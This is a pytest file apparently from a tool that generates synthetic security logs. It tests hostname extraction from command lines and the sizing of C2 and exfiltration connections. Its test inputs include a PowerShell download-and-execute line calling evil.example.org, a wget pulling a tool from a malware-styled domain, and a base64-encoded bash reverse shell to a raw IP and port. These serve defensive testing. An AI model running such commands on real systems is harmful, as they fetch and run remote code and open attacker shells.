# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Tests for Theme 2: storyline network correlation (P0-2).

Covers:
- ConnectionEventSpec.hostname field
- Storyline handler using spec.hostname for DNS/SSL
- Validation warning for process commands with URLs missing sibling connections
- URL hostname extraction utility
"""

from datetime import datetime

import pytest
from pydantic import ValidationError

from evidenceforge.generation.engine.storyline import StorylineMixin
from evidenceforge.models import (
    BaselineActivity,
    Environment,
    OutputSpec,
    Scenario,
    StorylineEvent,
    System,
    TimeWindow,
    User,
)
from evidenceforge.models.scenario import ConnectionEventSpec
from evidenceforge.validation import ScenarioValidator
from evidenceforge.validation.url_extractor import extract_hostnames_from_command

# ---------------------------------------------------------------------------
# URL extractor tests
# ---------------------------------------------------------------------------


class TestUrlExtractor:
    """Tests for extract_hostnames_from_command()."""

    def test_invoke_webrequest(self):
        cmd = "powershell.exe -Command \"Invoke-WebRequest -Uri 'https://cdn-assets-update.com/update.zip'\""
        assert extract_hostnames_from_command(cmd) == {"cdn-assets-update.com"}

    def test_downloadstring(self):
        cmd = "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.example.org/payload.ps1')\""
        assert extract_hostnames_from_command(cmd) == {"evil.example.org"}

    def test_curl(self):
        cmd = "curl -s https://api.example.com/status"
        assert extract_hostnames_from_command(cmd) == {"api.example.com"}

    def test_wget(self):
        cmd = "wget https://download.malware-domain.net/tool.tar.gz -O /tmp/tool.tar.gz"
        assert extract_hostnames_from_command(cmd) == {"download.malware-domain.net"}

    def test_raw_ip_ignored(self):
        """Raw IP addresses in URLs should not be extracted as hostnames."""
        cmd = "Invoke-WebRequest -Uri 'https://159.65.43.201/payload'"
        assert extract_hostnames_from_command(cmd) == set()

    def test_no_urls(self):
        cmd = "cmd.exe /c whoami"
        assert extract_hostnames_from_command(cmd) == set()

    def test_multiple_urls(self):
        cmd = "curl https://first.example.com/a && wget http://second.example.org/b"
        result = extract_hostnames_from_command(cmd)
        assert result == {"first.example.com", "second.example.org"}

    def test_bare_process_name(self):
        cmd = "notepad.exe"
        assert extract_hostnames_from_command(cmd) == set()

    def test_raw_dev_tcp_endpoint_detected_inside_shell_base64(self):
        cmd = (
            "bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi "
            "| base64 -d | bash'"
        )
        assert StorylineMixin._command_contains_raw_tcp_endpoint(cmd, "45.33.32.30", 8443)


# ---------------------------------------------------------------------------
# ConnectionEventSpec.hostname field tests
# ---------------------------------------------------------------------------


class TestConnectionEventSpecHostname:
    """Tests for the hostname field on ConnectionEventSpec."""

    def test_hostname_accepted(self):
        spec = ConnectionEventSpec(
            dst_ip="159.65.43.201",
            dst_port=443,
            hostname="cdn-assets-update.com",
        )
        assert spec.hostname == "cdn-assets-update.com"

    def test_hostname_defaults_none(self):
        spec = ConnectionEventSpec(dst_ip="159.65.43.201")
        assert spec.hostname is None

    def test_response_body_len_rejects_unbounded_values(self):
        """response_body_len must stay within datetime-safe realistic bounds."""
        with pytest.raises(ValidationError):
            ConnectionEventSpec(
                dst_ip="159.65.43.201",
                response_body_len=100_000_000_000_000_000_000,
            )

    def test_hostname_in_storyline_event(self):
        """hostname field works when embedded in a storyline event dict."""
        scenario = Scenario(
            version="1.0",
            name="test",
            description="Test scenario",
            environment=Environment(
                description="Test env",
                users=[User(username="testuser", full_name="Test User", email="t@e.com")],
                systems=[
                    System(hostname="DC-01", ip="10.0.0.1", os="Windows Server 2019", type="server")
                ],
            ),
            time_window=TimeWindow(start=datetime(2024, 1, 15, 10, 0, 0), duration="1h"),
            baseline_activity=BaselineActivity(
                description="Test", intensity="medium", variation="low"
            ),
            storyline=[
                StorylineEvent(
                    id="evt-net-001",
                    time="2024-01-15T10:30:00Z",
                    actor="testuser",
                    system="DC-01",
                    activity="C2 callback",
                    events=[
                        {
                            "type": "connection",
                            "dst_ip": "159.65.43.201",
                            "dst_port": 443,
                            "hostname": "cdn-assets-update.com",
                        }
                    ],
                )
            ],
            output=OutputSpec(logs=[{"format": "zeek"}], destination="./output", compression=False),
        )
        # Scenario parses without error
        assert scenario.storyline[0].events[0].hostname == "cdn-assets-update.com"


# ---------------------------------------------------------------------------
# Validation warning tests
# ---------------------------------------------------------------------------


class TestProcessNetworkPairingValidation:
    """Tests for _validate_process_network_pairing() warning."""

    def _make_scenario(self, events_list):
        """Helper to build a minimal scenario with one storyline entry."""
        return Scenario(
            version="1.0",
            name="test",
            description="Test scenario",
            environment=Environment(
                description="Test env",
                users=[User(username="testuser", full_name="Test User", email="t@e.com")],
                systems=[
                    System(hostname="DC-01", ip="10.0.0.1", os="Windows Server 2019", type="server")
                ],
            ),
            time_window=TimeWindow(start=datetime(2024, 1, 15, 10, 0, 0), duration="1h"),
            baseline_activity=BaselineActivity(
                description="Test", intensity="medium", variation="low"
            ),
            storyline=[
                StorylineEvent(
                    id="evt-net-001",
                    time="2024-01-15T10:30:00Z",
                    actor="testuser",
                    system="DC-01",
                    activity="test activity",
                    events=events_list,
                )
            ],
            output=OutputSpec(
                logs=[{"format": "windows"}], destination="./output", compression=False
            ),
        )

    def test_warns_on_process_url_without_connection(self):
        """Process with URL but no sibling connection should warn."""
        scenario = self._make_scenario(
            [
                {
                    "type": "process",
                    "process_name": "powershell.exe",
                    "command_line": "powershell.exe Invoke-WebRequest -Uri 'https://cdn-assets-update.com/update.zip'",
                }
            ]
        )
        validator = ScenarioValidator(scenario)
        issues = validator.validate()

        pairing_warnings = [
            i for i in issues if "cdn-assets-update.com" in i.message and i.severity == "warning"
        ]
        assert len(pairing_warnings) == 1
        assert "connection event" in pairing_warnings[0].suggestion.lower()

    def test_no_warning_when_connection_has_hostname(self):
        """Process+connection pair with matching hostname should not warn."""
        scenario = self._make_scenario(
            [
                {
                    "type": "process",
                    "process_name": "powershell.exe",
                    "command_line": "powershell.exe Invoke-WebRequest -Uri 'https://cdn-assets-update.com/update.zip'",
                },
                {
                    "type": "connection",
                    "dst_ip": "159.65.43.201",
                    "dst_port": 443,
                    "hostname": "cdn-assets-update.com",
                },
            ]
        )
        validator = ScenarioValidator(scenario)
        issues = validator.validate()

        pairing_warnings = [
            i for i in issues if "cdn-assets-update.com" in i.message and i.severity == "warning"
        ]
        assert len(pairing_warnings) == 0

    def test_no_warning_for_raw_ip_url(self):
        """Process with raw-IP URL should not warn (no domain to pair)."""
        scenario = self._make_scenario(
            [
                {
                    "type": "process",
                    "process_name": "powershell.exe",
                    "command_line": "powershell.exe Invoke-WebRequest -Uri 'https://159.65.43.201/payload'",
                }
            ]
        )
        validator = ScenarioValidator(scenario)
        issues = validator.validate()

        pairing_warnings = [
            i
            for i in issues
            if "process command references" in i.message and i.severity == "warning"
        ]
        assert len(pairing_warnings) == 0

    def test_no_warning_for_process_without_url(self):
        """Process without URL in command line should not warn."""
        scenario = self._make_scenario(
            [
                {
                    "type": "process",
                    "process_name": "cmd.exe",
                    "command_line": "cmd.exe /c whoami",
                }
            ]
        )
        validator = ScenarioValidator(scenario)
        issues = validator.validate()

        pairing_warnings = [
            i
            for i in issues
            if "process command references" in i.message and i.severity == "warning"
        ]
        assert len(pairing_warnings) == 0


# ---------------------------------------------------------------------------
# Raw-IP storyline connection regression test
# ---------------------------------------------------------------------------


class TestRawIpStorylineConnection:
    """Regression: raw-IP connections must not sprout DNS from reverse-DNS."""

    def test_raw_ip_connection_has_no_hostname(self):
        """ConnectionEventSpec without hostname stays None (no REVERSE_DNS fallback)."""
        spec = ConnectionEventSpec(dst_ip="159.65.43.201", dst_port=443)
        # The storyline handler uses `spec.hostname` directly — no fallback.
        # This ensures C2/exfil to raw IPs never acquire fabricated domains.
        assert spec.hostname is None
        # Confirm emit_dns would be False when hostname is None
        conn_hostname = spec.hostname  # no REVERSE_DNS.get() fallback
        assert conn_hostname is None
        assert (conn_hostname is not None) is False  # emit_dns guard

    def test_explicit_hostname_preserved(self):
        """ConnectionEventSpec with explicit hostname uses it."""
        spec = ConnectionEventSpec(
            dst_ip="159.65.43.201",
            dst_port=443,
            hostname="cdn-assets-update.com",
        )
        conn_hostname = spec.hostname
        assert conn_hostname == "cdn-assets-update.com"
        assert (conn_hostname is not None) is True


# ---------------------------------------------------------------------------
# Connection byte sizing and conn_state tests
# ---------------------------------------------------------------------------


class TestConnectionEventSpecFields:
    """Test new orig_bytes, resp_bytes, and conn_state fields."""

    def test_accepts_byte_fields(self):
        spec = ConnectionEventSpec(
            dst_ip="10.0.0.1",
            dst_port=443,
            orig_bytes=5_000_000,
            resp_bytes=200,
        )
        assert spec.orig_bytes == 5_000_000
        assert spec.resp_bytes == 200

    def test_accepts_conn_state(self):
        spec = ConnectionEventSpec(
            dst_ip="10.0.0.1",
            dst_port=443,
            conn_state="S0",
        )
        assert spec.conn_state == "S0"

    def test_defaults_to_none(self):
        spec = ConnectionEventSpec(dst_ip="10.0.0.1")
        assert spec.orig_bytes is None
        assert spec.resp_bytes is None
        assert spec.conn_state is None


class TestSizeStorylineConnection:
    """Test _size_storyline_connection heuristic."""

    def test_exfil_large_orig_bytes(self):
        import random

        from evidenceforge.generation.engine.storyline import (
            _size_storyline_connection,
        )

        spec = ConnectionEventSpec(
            dst_ip="10.0.0.1",
            technique="T1041",
            description="Exfiltrate patient records",
        )
        rng = random.Random(42)
        ob, rb = _size_storyline_connection(spec, rng)
        assert ob >= 1_000_000, f"Exfil orig_bytes too small: {ob}"
        assert rb <= 50_000, f"Exfil resp_bytes too large: {rb}"

    def test_c2_small_bidirectional(self):
        import random

        from evidenceforge.generation.engine.storyline import (
            _size_storyline_connection,
        )

        spec = ConnectionEventSpec(
            dst_ip="10.0.0.1",
            technique="T1071.001",
            description="C2 beacon callback",
        )
        rng = random.Random(42)
        ob, rb = _size_storyline_connection(spec, rng)
        assert ob <= 5_000, f"C2 orig_bytes too large: {ob}"
        assert rb <= 10_000, f"C2 resp_bytes too large: {rb}"

    def test_download_large_resp_bytes(self):
        import random

        from evidenceforge.generation.engine.storyline import (
            _size_storyline_connection,
        )

        spec = ConnectionEventSpec(
            dst_ip="10.0.0.1",
            technique="T1105",
            description="Download second-stage payload",
        )
        rng = random.Random(42)
        ob, rb = _size_storyline_connection(spec, rng)
        assert ob <= 2_000, f"Download orig_bytes too large: {ob}"
        assert rb >= 50_000, f"Download resp_bytes too small: {rb}"

    def test_explicit_overrides_heuristic(self):
        import random

        from evidenceforge.generation.engine.storyline import (
            _size_storyline_connection,
        )

        spec = ConnectionEventSpec(
            dst_ip="10.0.0.1",
            technique="T1041",
            description="Exfiltrate data",
            orig_bytes=999,
            resp_bytes=111,
        )
        rng = random.Random(42)
        ob, rb = _size_storyline_connection(spec, rng)
        assert ob == 999
        assert rb == 111

    def test_round_explicit_exfil_size_gets_archive_variance(self):
        import random

        from evidenceforge.generation.engine.storyline import (
            _size_storyline_connection,
        )

        exact_256_mib = 268_435_456
        spec = ConnectionEventSpec(
            dst_ip="10.0.0.1",
            technique="T1041",
            description="Upload 256 MB staged archive for exfiltration",
            orig_bytes=exact_256_mib,
            resp_bytes=2048,
        )
        rng = random.Random(42)
        ob, rb = _size_storyline_connection(spec, rng)
        assert ob != exact_256_mib
        assert abs(ob - exact_256_mib) > 1_000_000
        assert ob % (1024 * 1024) != 0
        assert rb == 2048

    def test_nonround_explicit_exfil_size_is_preserved(self):
        import random

        from evidenceforge.generation.engine.storyline import (
            _size_storyline_connection,
        )

        archive_size = 269_781_337
        spec = ConnectionEventSpec(
            dst_ip="10.0.0.1",
            technique="T1041",
            description="Upload compressed archive for exfiltration",
            orig_bytes=archive_size,
            resp_bytes=2048,
        )
        rng = random.Random(42)
        ob, rb = _size_storyline_connection(spec, rng)
        assert ob == archive_size
        assert rb == 2048

    def test_default_range(self):
        import random

        from evidenceforge.generation.engine.storyline import (
            _size_storyline_connection,
        )

        spec = ConnectionEventSpec(
            dst_ip="10.0.0.1",
            description="Generic connection",
        )
        rng = random.Random(42)
        ob, rb = _size_storyline_connection(spec, rng)
        assert 1_000 <= ob <= 10_000
        assert 5_000 <= rb <= 50_000
